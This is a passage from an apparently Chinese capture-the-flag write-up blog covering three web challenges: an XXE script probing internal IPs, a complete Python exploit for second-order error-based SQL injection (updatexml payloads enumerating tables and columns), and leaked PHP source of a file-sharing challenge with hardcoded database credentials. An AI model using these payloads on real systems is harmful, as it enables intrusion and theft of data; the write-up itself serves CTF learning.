class="line">burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/xml, text/xml, */*; q=0.01&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/xml;charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://c0e227bf-da5e-410d-83fc-5e7ff8421a70.node4.buuoj.cn:81&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://c0e227bf-da5e-410d-83fc-5e7ff8421a70.node4.buuoj.cn:81/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;  &lt;!DOCTYPE evo1 [\r\n&lt;!ENTITY flag SYSTEM \&quot;http://10.244.80.&#123;&#125;\&quot;&gt; \r\n]&gt; \r\n\r\n&lt;user&gt;&lt;username&gt;\r\n&amp;flag;\r\n&lt;/username&gt;&lt;password&gt;c&lt;/password&gt;&lt;/user&gt;\r\n&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]====&gt;&quot;</span>+<span class="built_in">str</span>(i)) <span class="comment">#31,165,177,180,227</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>,response.text)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-]&quot;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>取一个奇怪的用户名<code>a\&#39;&quot;</code>和密码&#96;&#96;a&#39;“<code>然后去</code>&#x2F;changepwd.php&#96;修改密码出现下述报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&quot;a\&#x27;</span>&quot;&quot; <span class="keyword">and</span> pwd<span class="operator">=</span><span class="string">&#x27;a9d4759436b444ab83901f92c14d9208&#x27;&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>是个二次注入并且有报错，并且根据前面的报错可以猜测出部分语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span> username<span class="operator">=</span>&quot;xxxx&quot; <span class="keyword">and</span> pwd<span class="operator">=</span><span class="string">&#x27;xxxx&#x27;</span></span><br></pre></td></tr></table></figure><p>测试发现有些字符被<code>ban</code>掉了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格、and、/**/、substr、left、right、mid</span><br></pre></td></tr></table></figure><p>进行报错注入即可，为了方便简单写了个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://99ee8eb9-e380-4cab-bba4-698d7d6bf05b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">burp0_url = url + <span class="string">&quot;register.php&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;kdm54kkheudhtcvk7mmt5eqbe0&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]Success!username:&quot;</span>+username)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;exist&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]Success!user exists!username:&quot;</span>+username)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-]Error!\n&quot;</span>,r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username</span>):</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">burp0_url = url + <span class="string">&quot;login.php&quot;</span></span><br><span class="line">burp0_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line"><span class="comment"># 需要禁止重定向，不然获取不到Set-Cookie</span></span><br><span class="line">r = session.post(burp0_url, headers=burp0_headers, data=burp0_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">PHPSESSID = re.findall(<span class="string">r&#x27;PHPSESSID=(.*);&#x27;</span>,r.headers[<span class="string">&quot;Set-Cookie&quot;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(PHPSESSID)</span></span><br><span class="line"><span class="keyword">if</span> PHPSESSID:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]PHPSESSID=&quot;</span>+PHPSESSID)</span><br><span class="line"><span class="keyword">return</span> PHPSESSID</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-]Fail!\n&quot;</span>+r.headers+<span class="string">&#x27;\n&#x27;</span>+r.text)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changepwd</span>(<span class="params">PHPSESSID</span>):</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">burp0_url = url + <span class="string">&quot;changepwd.php&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: PHPSESSID&#125;</span><br><span class="line"></span><br><span class="line">burp0_data = &#123;<span class="string">&quot;oldpass&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;newpass&quot;</span>: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">res = re.findall(<span class="string">r&#x27;XPATH syntax error:(.*)&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;[+]&quot;</span>+res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">username = <span class="string">&quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e),1))#&quot;</span></span><br><span class="line">register(username)</span><br><span class="line">PHPSESSID = login(username)</span><br><span class="line">flag1 = changepwd(PHPSESSID)[<span class="number">6</span>:<span class="number">17</span>]</span><br><span class="line">username = <span class="string">&quot;-1\&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^f&#x27;)))),0x7e),1))#&quot;</span></span><br><span class="line">register(username)</span><br><span class="line">PHPSESSID = login(username)</span><br><span class="line">flag2 = changepwd(PHPSESSID)[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag1+flag2[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># 一键获取flag</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一步步获取flag</span></span><br><span class="line"><span class="comment"># 库 web_sqli</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># 表 article,flag,users</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># flag列 flag</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># RCTF&#123;Good job! But flag not her</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># users列 name,pwd,email,real_flag_1s_her</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># 使用正则获得完整列名 real_flag_1s_here</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;)),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># flag&#123;81f83db5-8290-4516-8e1b-1b</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># &#125;b771e8faa7b1-b1e8-6154-0928-5b</span></span><br><span class="line"><span class="comment"># username = &quot;-1\&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^f&#x27;)))),0x7e),1))#&quot;</span></span><br><span class="line"><span class="comment"># # 反转一下拼接起来flag&#123;81f83db5-8290-4516-8e1b-1b7aaf8e177b&#125;</span></span><br><span class="line"><span class="comment"># register(username)</span></span><br><span class="line"><span class="comment"># PHPSESSID = login(username)</span></span><br><span class="line"><span class="comment"># print(changepwd(PHPSESSID))</span></span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>随便传一个gif发现有下载按钮，直接下载<code>/var/www/html</code>目录下的文件</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">  &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .bd-placeholder-img &#123;</span><br><span class="line">      font-size: <span class="number">1.125</span>rem;</span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">media</span> (min-<span class="attr">width</span>: <span class="number">768</span>px) &#123;</span><br><span class="line">      .bd-placeholder-img-lg &#123;</span><br><span class="line">        font-size: <span class="number">3.5</span>rem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- Custom styles <span class="keyword">for</span> this template --&gt;</span><br><span class="line">  &lt;link href=<span class="string">&quot;static/css/std.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">signin</span>&quot; <span class="title">action</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">h3</span> <span class="title">mb</span>-3 <span class="title">font</span>-<span class="title">weight</span>-<span class="title">normal</span>&quot;&gt;登录&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">sr</span>-<span class="title">only</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">required</span> <span class="title">autofocus</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">sr</span>-<span class="title">only</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">block</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;提交&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-5 <span class="title">text</span>-<span class="title">muted</span>&quot;&gt;还没有账号? &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">muted</span>&quot;&gt;&amp;<span class="title">copy</span>; 2018-2019&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">bundle</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">js</span>/<span class="title">toast</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">register</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;注册成功&#x27;, &#x27;info&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">verify_user</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] = <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;账号或密码错误&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span 